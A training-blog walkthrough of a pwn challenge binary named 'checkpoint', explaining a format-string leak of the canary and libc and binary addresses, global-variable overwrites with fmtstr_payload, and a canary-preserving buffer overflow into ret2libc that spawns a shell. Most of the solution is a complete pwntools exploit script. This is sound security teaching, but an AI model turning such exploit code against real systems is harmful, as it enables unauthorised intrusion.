---
layout: post
author: tourpran
title: Checkpoint
categories: pwn-training
tags: ["pwn", "format string"]
---

![](/images/checkpointaresx/ss1.png)

### Introduction:
Hey everyone, congrats on reaching this level. This level acts as a checkpoint (name suggests). You will be combining the idea of format strings, buffer overflows, canaries from previous blogposts. Try this level on your own and check for hints when stuck.

### Challenge:
Download below challenge file.

[FILES](/images/checkpointaresx/checkpoint_1.zip)

### Solution:

#### Mitigations:
![](/images/checkpointaresx/ss2.png)
No need to explain mitigations right ?

#### Code Walkthrough:

We are given the c code. Here in the main program, there is a while loop to run the format string vulnerability and finally a compare statement leading to a fgets call.

![](/images/checkpointaresx/ss3.png)

#### Sample run:
Runing the file tells us there is a format string exploit.
![](/images/checkpointaresx/ss4.png)


#### Exploit idea:
Here the challenge is direct and was made to recap what we learnt in the previous blogs. The attack plan is
* leaking a binary address, libc address, canary.
* make the strength variable = "STRENGTH"
* increase the size variable to a much larger value for a buffer overflow. (tricky part)

#### Format string exploit:

We already know what format strings are... now leak the stack little by little and see what useful values you get. I got the following values:

```leak
16: my input
49: canary
51: a libc address
56: a binary address
```

Now you got the values so calculate the address relatively with the binary/libc or initialise the binary and libc as elf with the help of pwntools ELF() function.

```py
#Need to know the libc. (used by default libc for local purpose)
elf.address = int((str(leak[2])[4:-3]), 16) - elf.sym.__libc_csu_init
libc.address = int((str(leak[1])[4:-1]), 16) - 159923
canary = int((str(leak[0])[4:-1]), 16)
#My weird way of receiving and splitin.
```
#### Formats again:
The second task was to change the value of the global variables and make it favourable for us.

```py
fmt = fmtstr_payload(16, {
    elf.sym.size: 500,
    elf.sym.strength: u64(b"STRENGTH"),
})
```
Here I am making the size variable much larger than buffer size, making strength variable equal to "STRENGTH" to pass the check.

#### Buffer Overflow:

Finally you do a bit of fiddling to get the correct offset of the stack canary and overwrite with the leaked canary, then simply do a ret2libc.

#### Exploit:

```py

from pwn import *

exe = './checkpoint'
context.binary = elf = ELF(exe)

libc = "/usr/lib/x86_64-linux-gnu/libc.so.6"
if(libc != ""):
	libc = ELF(libc)

def start(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

gdbscript = '''
b* main
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

'''
NOTES:
16: my input
49: canary
51: a libc address
56: a binary address
'''

p = start()

p.recv()
p.sendline(b"%49$p-%51$p-%56$p")
leak = p.recvline().split(b"-")

elf.address = int((str(leak[2])[4:-3]), 16) - elf.sym.__libc_csu_init
libc.address = int((str(leak[1])[4:-1]), 16) - 159923
canary = int((str(leak[0])[4:-1]), 16)

log.info(f"elf base: {hex(elf.address)}")
log.info(f"libc base: {hex(libc.address)}")

fmt = fmtstr_payload(16, {
    elf.sym.size: 500,
    elf.sym.strength: u64(b"STRENGTH"),
})

p.recv()
p.sendline(b"y")
p.send(fmt)

p.recv()
p.sendline(b"$p")
p.sendline(b"n")
p.sendline(b"A"*0x158 + p64(canary) + p64(0) + p64(elf.address + 0x1016) + p64(elf.address+0x151b)+ p64(next(libc.search(b'/bin/sh'))) + p64(libc.sym.system))

p.interactive()

```

This was short and crisp since all these topics are already covered in the rest of the blogs. Happy Hacking.